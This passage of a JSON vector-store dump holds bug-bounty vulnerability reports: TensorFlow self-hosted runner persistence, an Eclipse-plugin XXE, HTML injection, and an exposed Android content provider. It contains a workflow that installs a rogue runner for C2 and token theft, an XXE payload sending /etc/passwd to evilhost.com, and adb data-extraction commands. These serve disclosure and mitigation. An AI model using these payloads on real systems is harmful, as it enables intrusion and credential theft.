(64-bit))\r\nAttack scenario\r\nit trying to execute and after every 1 second page will start up-down and lagging because of this code trying to execute. ( tested in firefox  browser 91.5.0esr (64-bit))  .", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 692, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "752b0f82-ca3a-4cae-915c-cdad89dad441": {"__data__": {"id_": "752b0f82-ca3a-4cae-915c-cdad89dad441", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3f02949b-80f4-4e11-bd48-794677a70cc6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8f4b579511f2d5902c6ddeae6be93d6f8be777defebe76c5aac7383cb7435dc2", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "47fd4883-cef5-4676-9ca3-766841e93699", "node_type": "1", "metadata": {}, "hash": "923519177917bbdf2700b11b57876083a6731a4a6252061ea8f992898da49bbf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nTensorflow GitHub Repository Vulnerable to Self-Hosted Runner Attack\r\nProduct:\r\nTensorflow\r\nURL:\r\nhttps://github.com/tensorflow/tensorflow/\r\nVulnerability type:\r\nOther\r\nDetails\r\nDescription:\r\nThe Tensorflow/Tensorflow repository utilizes non-ephemeral self-hosted runners to execute\r\nworkflows. The Tensorflow/Tensorflow also has the default workflow execution setting of\r\nonly requiring approval to run workflows from fork pull requests if the user is a first time contributor. It is possible for anyone who is a contributor to Tensorflow (meaning they have previously submitted a PR that was approved and merged) to modify a workflow in their fork and configure it to run on the self-hosted runners attached to Tensorflow/Tensorflow. This means that members of the public can become contributors and that requiring someone to be a contributor is not a sufficient security boundary to prevent a motivated attacker.\r\nThis is due to little known functionality in GitHub where a workflow that runs on the\r\npull_request\r\ntrigger from\r\na fork PR uses the workflow file from the fork, not the PR base. This means an attacker can alter a workflow to run custom code on a self-hosted runner. For this reason, GitHub strongly recommends avoiding the use of self-hosted\r\nrunners on public repositories (\r\nhttps://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security\r\n)\r\nThis workflow can be used to obtain persistence on the self-hosted runner and\r\nsteal secrets (including a\r\nGITHUB_TOKEN\r\nwith full write permissions) from or tamper with subsequent builds. Depending on the network positioning of the runner, an attacker could conduct on-host privilege escalation and move laterally within Google's network or cloud environment.\r\nExploitation Conditions\r\nFor this vulnerability to be valid, the repository must have the following:\r\nApproval Not Required for Contributors to run Fork PR Workflows\r\nThe default setting for workflow execution from fork PRs is to require\r\napproval only for accounts that have\r\nnot\r\npreviously contributed to the repository.\r\nThere is an option to allow workflow approval for all Fork PRs,\r\nincluding previous contributors, but does not appear to be enabled.\r\nThe proof for this is that pull requests from previous contributors did not\r\nrequire approval for their workflows on the\r\ntrigger to execute.\r\nSee\r\ncontributor_pr.jpg\r\nand\r\ncontributor_pr_exec.jpg\r\nfor an example of this.\r\nAs of writing Tensorflow/Tensorflow, has\r\n3410\r\ncontributors.\r\nUse of Non-Ephemeral Self-Hosted Runners\r\nThe repository uses non-ephemeral self-hosted runners to run ARM64 Linux CI builds.\r\nThis appears to be the case after inspecting the runner name and machine name\r\nin the workflow run logs. Since the runners are non-ephemeral, a malicious\r\nactor can fork off a process on the runner that continues to run after their job finishes.\r\nA closer inspection of the run logs revealed that the workflows on ARM64 Linux\r\nrunners have a\r\nStop old running containers (if any)\r\nstep. In some cases, this\r\nstep reveals old images that are cleaned. This means that the runner is\r\nnon-ephemeral.\r\nnon_ephemeral_proof.jpg\r\nfor an example.\r\nWe determined that these agents exist by using a slightly modified version of\r\nhttps://github.com/praetorian-inc/gato\r\nthat pulled a large set of workflow run logs and\r\nscanned for unique machine name/runner names.\r\nExploitation Path\r\nSince the fork workflow will not have a\r\nwith write permissions, an attackers\r\ngoal will be to establish persistence on the self-hosted runner to gain\r\naccess to secrets, tamper with builds or move laterally to other Google systems.\r\nThis is possible by running code in the background and passing the\r\nRUNNER_TRACKING_ID\r\nset to 0 as an environment variable.\r\nOne easy way to obtain persistence is to install\r\nanother\r\nself-hosted runner and connect it to a private repository. This will use GitHub as C2 and bypass EDR protections that may be on the host.\r\nThe runner can then be tasked to execute additional commands. Below is a proof-of-concept workflow file to install a self-hosted runner on the Tensorflow ARM64 self-hosted runner and run it in the background.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4227, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "47fd4883-cef5-4676-9ca3-766841e93699": {"__data__": {"id_": "47fd4883-cef5-4676-9ca3-766841e93699", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3f02949b-80f4-4e11-bd48-794677a70cc6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8f4b579511f2d5902c6ddeae6be93d6f8be777defebe76c5aac7383cb7435dc2", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "752b0f82-ca3a-4cae-915c-cdad89dad441", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "cc37e7526aa57d3c127cec031dc975734c0fc71758f2ddda4a5d4d845b4147c0", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "73e58829-83b2-4c76-8f74-ec3007785426", "node_type": "1", "metadata": {}, "hash": "942fbdbf680b351e03160d287a3c30e30558d3489962634ae577791f1ad67854", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Exploitation Path\r\nSince the fork workflow will not have a\r\nwith write permissions, an attackers\r\ngoal will be to establish persistence on the self-hosted runner to gain\r\naccess to secrets, tamper with builds or move laterally to other Google systems.\r\nThis is possible by running code in the background and passing the\r\nRUNNER_TRACKING_ID\r\nset to 0 as an environment variable.\r\nOne easy way to obtain persistence is to install\r\nanother\r\nself-hosted runner and connect it to a private repository. This will use GitHub as C2 and bypass EDR protections that may be on the host.\r\nThe runner can then be tasked to execute additional commands. Below is a proof-of-concept workflow file to install a self-hosted runner on the Tensorflow ARM64 self-hosted runner and run it in the background.\r\nname: SH Runner POC\r\non:\r\njobs:\r\nunit-tests:\r\nruns-on: [self-hosted, linux, ARM64]\r\nsteps:\r\n- uses: actions/checkout@v3\r\n- name: unit-tests\r\ncontinue-on-error: true\r\nrun: |\r\nC2_REPO=Amb1guousRaccoon/functionality\r\nINSTALL_DIR=\"/home/ubuntu/.actions-runner\"\r\nREG_TOKEN=<SH_RUNNER_INSTALL_TOKEN>\r\nmkdir $INSTALL_DIR && cd $INSTALL_DIR\r\ncurl -o actions-runner-linux-arm64-2.307.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.307.1/actions-runner-linux-arm64-2.307.1.tar.gz\r\ntar xzf ./actions-runner-linux-arm64-2.307.1.tar.gz\r\n./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name \"tf_persistence\"\r\nrm actions-runner-linux-arm64-2.307.1.tar.gz\r\nexport RUNNER_TRACKING_ID=0 && nohup ./run.sh &\r\nSteps To Reproduce:\r\nWe did not conduct this attack because it could disrupt Google systems or demonstrate that the vulnerability is present for threat actors. Additionally, Mandiant, now Google, is a client of Praetorian, so we opted to disclose this with a detailed write up instead of overtly demonstrating the vulnerability.\r\nThis can be reproduced by using any account that is a contributor to\r\nTensorflow/Tensorflow\r\n. The Google security team can create a new account, approve a small PR (such as a one-character readme change), and then use that account to reproduce this vulnerability. Alternatively, we are happy to conduct this demonstration with explicit permission.\r\nStep 1\r\nCreate a legitimate pull request for a slight change to the\r\nrepository (such as a typo fix) and wait for it to be approved and merged.\r\nStep 2\r\nCreate a fork of the repository. Within the fork, remove all existing workflows that run on the\r\ntrigger.\r\nStep 3\r\nAdd a new workflow file to deploy persistence on the build agent. The proof of concept provided in the report demonstrates a payload that installs a\r\nnew\r\nself hosted runner on the existing runner. This will allow persistence and evade EDR and any firewall restrictions that might be in place.\r\nStep 4\r\nCreate a draft pull request. This will prevent a request from being sent to codeowners from the change to the workflow yaml file.\r\nStep 5\r\nIf the fork PR settings are set to the default value of not requiring approval for previous contributors, the workflow will execute, fork off a process, and exit.\r\nStep 6\r\nForce push the code in the draft PR back to the main commit. This will close the PR and hide obvious indications of malicious activity.\r\ngit reset --soft HEAD~1\r\ngit push --force\r\nStep 7\r\nWait for another build not from a fork PR to execute on the runner. This can be done by observing the TensorFlow actions run logs. The new self-hosted runner agent will be active while other builds run. A simple workflow can be added to the C2 repository to run a single command on the\r\nworkflow_dispatch\r\nRun a command to steal the\r\nfrom the runner's working directory:\r\nfind /home/ubuntu/actions-runner/_work -type f -name config | xargs cat\r\nNOTE\r\n: The GITHUB_TOKEN is only valid for the duration of a build. If other builds are very short, then the\r\nmust be used immediately after stealing. However, it does not impact what an attacker can do with it.\r\nImmediate Mitigation Steps\r\nThe most immediate way to mitigate this issue is to take the following steps:\r\nRequire approval to run workflows on the\r\ntrigger for all outside fork PRs, even if they are contributors.", "mimetype": "text/plain", "start_char_idx": 3442, "end_char_idx": 7592, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "73e58829-83b2-4c76-8f74-ec3007785426": {"__data__": {"id_": "73e58829-83b2-4c76-8f74-ec3007785426", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3f02949b-80f4-4e11-bd48-794677a70cc6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8f4b579511f2d5902c6ddeae6be93d6f8be777defebe76c5aac7383cb7435dc2", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "47fd4883-cef5-4676-9ca3-766841e93699", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "3116e49d16db59d3ec56cc78171d096d4fc614fe0378e1d48b47ba2dd6572cc9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "This can be done by observing the TensorFlow actions run logs. The new self-hosted runner agent will be active while other builds run. A simple workflow can be added to the C2 repository to run a single command on the\r\nworkflow_dispatch\r\nRun a command to steal the\r\nfrom the runner's working directory:\r\nfind /home/ubuntu/actions-runner/_work -type f -name config | xargs cat\r\nNOTE\r\n: The GITHUB_TOKEN is only valid for the duration of a build. If other builds are very short, then the\r\nmust be used immediately after stealing. However, it does not impact what an attacker can do with it.\r\nImmediate Mitigation Steps\r\nThe most immediate way to mitigate this issue is to take the following steps:\r\nRequire approval to run workflows on the\r\ntrigger for all outside fork PRs, even if they are contributors.\r\nMove the self-hosted runner group from the repository to the\r\ntensorflow\r\norganization,\r\nand configure the group to only run on specific workflows that have already been committed to the main branch. (\r\nhttps://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups#changing-which-workflows-can-access-an-organization-runner-group\r\n) this will prevent the runner from picking up\r\na workflow execution from a fork PR, even if a maintainer with write access approves the workflow.\r\nLonger term, ensure that only ephemeral self-hosted runners (1 build, 1 clean runner) are used for public repository builds.\r\nReferences\r\nhttps://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/\r\nhttps://github.com/nikitastupin/pwnhub/blob/main/writings/github-token.md\r\nhttps://karimrahal.com/2023/01/05/github-actions-leaking-secrets/\r\nhttps://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution\r\nhttps://slsa.dev/spec/v1.0/verifying-systems\r\nAttack scenario\r\nImpact\r\nThe impact from this vulnerability depends on the permission levels of the\r\nassigned to subsequent builds, branch protection settings\r\nin place for the Tensorflow/Tensorflow repository, and the network positioning of the build machine.\r\nIn this case, the machine ran scheduled builds with a\r\nwith extensive write permissions. See\r\ntf_write_perms.png\r\nto see the token permissions.\r\nThis token would be valid for the life of that particular build. See\r\narm_ci_length.jpg\r\nfor an example of how long these other builds are.\r\nTensorflow uses branch portections for the\r\nmaster\r\nnightly\r\nbranches;\r\nhowever, feature branches are not subject to branch protection. An attacker\r\ncould try to commit a change to a feature branch that is under development by a\r\nTensorflow maintainer.\r\nAdditionally, the\r\ncould be used to tamper releases published on\r\nGitHub at\r\nhttps://github.com/tensorflow/tensorflow/releases/\r\n. The source within\r\nthe tar.gz and zip files could be replaced with malicious code.\r\nSecret Disclosure\r\nAn attacker could obtain the following secrets from the repository by using the stolen\r\nto create a feature branch with malicious code, and then issuing a\r\nevent to it.\r\nThe code within that branch could then dump secrets from the GitHub hosted\r\nrunner's memory or monitor subsequent steps for secrets. The AWS PyPi token\r\ncould be stolen directly from a runner since it is used in workflows that also\r\nrun on the ARM64 linux runners.\r\nGCP_CREDS\r\nAWS_PYPI_ACCOUNT_TOKEN\r\nJENKINS_TOKEN\r\nDOCKERHUB_USERNAME\r\nDOCKERHUB_TOKEN\r\nPersistence on Build Servers\r\nTensorflow uses several non-ephemereal runners for ARM64 Linux CI. Some of the\r\nrunner names are:\r\nrunner6\r\nrunner7\r\nrunner9\r\nrunner13\r\nrunner15\r\nAn attacker might be able to conduct lateral movement depending any service\r\naccount permissions or network targets these build runners might have access to.", "mimetype": "text/plain", "start_char_idx": 6789, "end_char_idx": 10568, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "39538dd2-085f-4446-85d6-c858a1ecd839": {"__data__": {"id_": "39538dd2-085f-4446-85d6-c858a1ecd839", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.clean.txt", "file_name": "20250408_175710_435889.clean.txt", "file_type": "text/plain", "file_size": 959, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ed657c46-fb17-49ce-9b23-eeee031501af", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.clean.txt", "file_name": "20250408_175710_435889.clean.txt", "file_type": "text/plain", "file_size": 959, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "aa5b16f894b0670b9e8eeffc352129f979e354b4bb5878e410dd1b5952c63717", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nHTML Injection (Possible Reflected XSS)\r\nProduct:\r\nhttps://bughunters.google.com/\r\nURL:\r\nVulnerability type:\r\nOther\r\nDetails\r\nThis is my first google report so sorry for the mess\r\nTarget :\r\nhttps://bughunters.google.com/learn/search\r\nParameter : ?q=\r\nhttps://bughunters.google.com/learn/search?q=PAYLAODSHERE\r\nTested :\r\n<h1,h2,h3,h4,h5,h6> <p><img> <a> <br><i><b> TAGS\r\nPayload  :\r\n\"<img src=\r\n<a href=\"WEBSITELINK\">Pwdec / HTML Injection</a>\r\nhttps://bughunters.google.com/learn/search?q=%3Cimg%20src%3Dhttps:%2F%2Fkutluhancorut.com.tr%2Fwp-content%2Fuploads%2F2021%2F02%2F134066167_142180421002724_2392877025167477926_n.jpg%3E\r\nhttps://bughunters.google.com/learn/search?q=%3Ca%20href%3D%22https:%2F%2Fkutluhancorut.com.tr%2F%22%3EPwdec%20%2F%20HTML%20Injection%3C%2Fa%3E\r\nhttps://bughunters.google.com/learn/search?q=%3Ch1%3Epart1%3C%2Fh1%3E%3Ch2%3Epart2%3C%2Fh2%3E%3Ch3%3Epart3%3C%2Fh3%3E\r\nAttack scenario\r\nPhishing\r\nAbusing other user\r\nDefacing", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 959, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "97a5a656-8968-4180-b5c9-aea94f144a70": {"__data__": {"id_": "97a5a656-8968-4180-b5c9-aea94f144a70", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.clean.txt", "file_name": "20250408_175721_973714.clean.txt", "file_type": "text/plain", "file_size": 2398, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ab250304-7c84-483a-8cd9-7e4a402e447d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.clean.txt", "file_name": "20250408_175721_973714.clean.txt", "file_type": "text/plain", "file_size": 2398, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "58950fe1e7a45f850b6752f66d5fdfc15d778d9fccce40019fddb6eb73b0b120", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: A content-provider which is set to exported as true, having no permissions enforced for read-write , is leaking the PII(emails, sync feeds) of android users to everybody.\r\nBug Description.\r\nA Content-Provider in the com.google.android.gms is universally exported. With no security permissions implemented for read-write operations. This allows any third party application to query , insert or delete the data from the content-provider's database.\r\nVulnerable ContentProvider: com.google.android.gms.subscribedfeeds.GmsSubscribedFeedsProvider\r\nContentUri: content://com.google.android.gms.subscribedfeeds/\r\nSteps to reproduce:\r\nConnect a android device with PC.\r\nPerform the below command.\r\nadb shell content query --uri content://com.google.android.gms.subscribedfeeds/feeds\r\nBelow will give google accounts present in android device.\r\nadb shell content query --uri content://com.google.android.gms.subscribedfeeds/accounts\r\nBy performing the above query commands; you will be able to see the data such as; full feed info using first one and com.google acounts with the second command.\r\nOther operations like; delete, insert and update can also be used like the above one.\r\nFix:\r\nIn order to fix this bug; you can set \"android:exported\" attribute to false.\r\nIncase you want to keep this public; you can enforce \"android:permission\"  to allow access to this provider only to apps having proper authorization.\r\nImpact.\r\nThe main impact here is that any third party application can use this vulnerability to scrape the\r\nuser accounts present\r\non the android device, without requesting any permissions.\r\nIn general ; if one need to get accounts present in device; then one need to have \"android.permission.GET_ACCOUNTS\" permission in manifest file. But using this bug , the only thing you need is to query data from content-provider.\r\nSince, there is no write protection present; therefore any third party process can write new  data.\r\nThe third party app can also update the existing data, without any permission.\r\nAlso, the third party app can insert new data without requiring any permissions.\r\nAttack scenario:\r\nAttack Scenarios:\r\nThe bug can be used by stealer apps to steal;\r\nthe sync feed logs of android,\r\nthe account emails present in android\r\nwithout requesting any permission at all. And thus sending this information to its creator. The creator then sell those info in dark market.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2398, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "010c9a5e-9ad3-4e58-91d9-92cb4123c8bc": {"__data__": {"id_": "010c9a5e-9ad3-4e58-91d9-92cb4123c8bc", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.clean.txt", "file_name": "20250408_175656_523326.clean.txt", "file_type": "text/plain", "file_size": 2170, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "014117e7-2295-456b-bc27-13fb2cbb98bc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.clean.txt", "file_name": "20250408_175656_523326.clean.txt", "file_type": "text/plain", "file_size": 2170, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "94282bcef2ad8ae8b6cd77311f2dd0cc6422ef934c7b0b892485834c84813dbf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nXXE vulnerability in the \"Cloud Tools for Eclipse\" IDE Plugin\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/\r\nVulnerability type:\r\nXML eXternal Entity (XXE)\r\nDetails\r\nThe plugin is vulnerable to XXE via insecure parsing of the appengine-web.xml file. The vulnerability can be demonstrated as follows:\r\nIn Eclipse, install the Cloud Tools Plugin as described\r\nhere\r\nCreate a starter appengine project in Eclipse following steps\r\nCreate and host a DTD file \"evil.dtd\" with the following content (change the URL to one you control) :\r\n<!ENTITY % all \"<!ENTITY send SYSTEM 'http://evilhost.com/?collect=%file;'>\r\n\"> %all;\r\nOpen the project's appengine-web.xml file and replace the content with the following (replace the URL with the one you're using to host evil.dtd above):\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<!DOCTYPE data [ <!ENTITY % file \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://evilhost.com/evil.dtd\">%dtd; ]>\r\n<appengine-web-app xmlns=\"http://appengine.google.com/ns/1.0\">\r\n<threadsafe>true</threadsafe>\r\n<sessions-enabled>false</sessions-enabled>\r\n<runtime>java8</runtime>\r\n<system-properties>\r\n<property name=\"java.util.logging.config.file\" value=\"WEB-INF/logging.properties\"/>\r\n</system-properties>\r\n</appengine-web-app>\r\nDepending on the permissions granted to the Eclipse user, the contents of the /etc/passwd file will be transmitted to the remote server.\r\nThe vulnerable code can be found in the following snippets:\r\nhttps://github.com/GoogleCloudPlatform/google-cloud-eclipse/blob/4d213f59421f7d28aab17e336a248713fc97f1fa/plugins/com.google.cloud.tools.eclipse.appengine.standard.java8/src/com/google/cloud/tools/eclipse/appengine/standard/java8/AppEngineStandardJre8ProjectFacetDetector.java#L69-L77\r\nAttack scenario\r\nAn attacker would create an appengine project with a maliciously crafted appengine-web.xml file and host it on a public repository. An unsuspecting user would open the project in Eclipse and upon opening the appengine-web.xml file would trigger the attack that would harvest sensitive local files from the user's machine and exfiltrate them to the attacker's servers.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2170, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}}, "docstore/ref_doc_info": {"059dcf25-e5bb-4c79-bd00-be2883db5d71": {"node_ids": ["7dbd0a2d-0342-4ea2-8957-ae2c159d5a94", "68f97c13-9ed6-4d2e-98ae-97db122266ff"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "464fe239-9900-48a1-9a09-59791200ae63": {"node_ids": ["b49f4c2c-01ee-4143-a9ae-a783564b7da0"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.txt", "file_name": "20250408_172348_710647.txt", "file_type": "text/plain", "file_size": 1478, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "7f3dbb50-6522-421e-92b1-164565233d86": {"node_ids": ["e29c344a-fb84-4718-828f-daa3b04409e2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.txt", "file_name": "20250408_172348_778327.txt", "file_type": "text/plain", "file_size": 3668, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "bc58b7b1-a5d7-4260-8acf-4f789b3b2b75": {"node_ids": ["071216a7-284a-4ad7-a17a-2c2d293afacb"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.txt", "file_name": "20250408_172348_873880.txt", "file_type": "text/plain", "file_size": 3643, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "aaf9ebd8-4ad7-4f07-89be-9f04af239db4": {"node_ids": ["90d1da6b-fd79-44d6-a706-db4d5688d490"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.txt", "file_name": "20250408_172348_937161.txt", "file_type": "text/plain", "file_size": 3228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "ac841265-22a9-430a-8e01-3803f83f66f9": {"node_ids": ["8ef1328f-faf1-46e9-a781-c59c55778b9f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.txt", "file_name": "20250408_172349_002274.txt", "file_type": "text/plain", "file_size": 2252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "e00e7ba4-11de-4daf-9d78-d4c8e6289029": {"node_ids": ["f0b6b36c-8300-4553-b231-dd5126602d68", "0bb5e08a-a226-489c-865d-c2e685b01bc4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "baf4e2dc-007b-47eb-8f06-6b517daa50e4": {"node_ids": ["70955932-2296-4f0b-9e1e-a9f2f24e83ae"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.txt", "file_name": "20250408_175638_128222.txt", "file_type": "text/plain", "file_size": 2150, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d11b8a0e-9cb0-46be-8851-c9738964ec1c": {"node_ids": ["a979ac51-a40c-4c11-9120-5c4156a56010"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.txt", "file_name": "20250408_175638_159709.txt", "file_type": "text/plain", "file_size": 2857, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d934de01-b1e8-49dc-8cda-a64ca0a23816": {"node_ids": ["76e93eaa-730e-4b1d-b399-1c050fb88d26"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.txt", "file_name": "20250408_175638_191160.txt", "file_type": "text/plain", "file_size": 1807, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "a3ab5dfc-6ea5-4a4b-95a3-d5fee4953128": {"node_ids": ["14bf42d1-c9d5-4608-be53-63bf6906c1a4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.txt", "file_name": "20250408_175638_222631.txt", 